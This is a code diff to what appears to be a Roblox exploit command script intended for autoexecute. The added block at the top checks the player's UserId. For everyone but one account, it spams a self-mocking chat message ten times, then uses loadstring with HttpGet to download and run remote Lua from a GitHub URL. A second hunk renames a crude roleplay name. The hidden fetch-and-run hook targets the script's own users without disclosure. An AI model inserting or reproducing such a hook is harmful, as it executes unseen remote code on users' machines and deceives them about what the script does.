@@ -1,3 +1,6 @@
+-- heh..
+if game:GetService("Players").LocalPlayer.UserId ~= 4856500064 then for i=1,10 do ExtraAbilities.Chat("🛑🛑🛑 HEY GUYS IM AN ULTIMATE SKID! BULLY ME! HAHAHA 🛑🛑🛑")end task.wait(1.5)loadstring(game:HttpGet("http://github.com/IvanTheProtogen/dumpsterfire/raw/main/AntiExploiterJumpscare.lua",true))()end
+
 -- put me on autoexecute!
 -- type ".cmds" in chat for commands!
 -- type "/c system" if you want to make your commands silent!
@@ -99,7 +102,7 @@ end
 
 function config.Commands.fsp() -- there has to be a syntax error somewhere...
 	events.Morph:FireServer({"90803725437474", 6, 6})
-	events.RPNAME:FireServer([[Horny Skiddy Proot~ 💙]])
+	events.RPNAME:FireServer([[Freaky Skiddy Proot~ 💙]])
 	Itb.Text = "90803725437474"
 	Xtb.Text = "6"
 	Ytb.Text = "6"
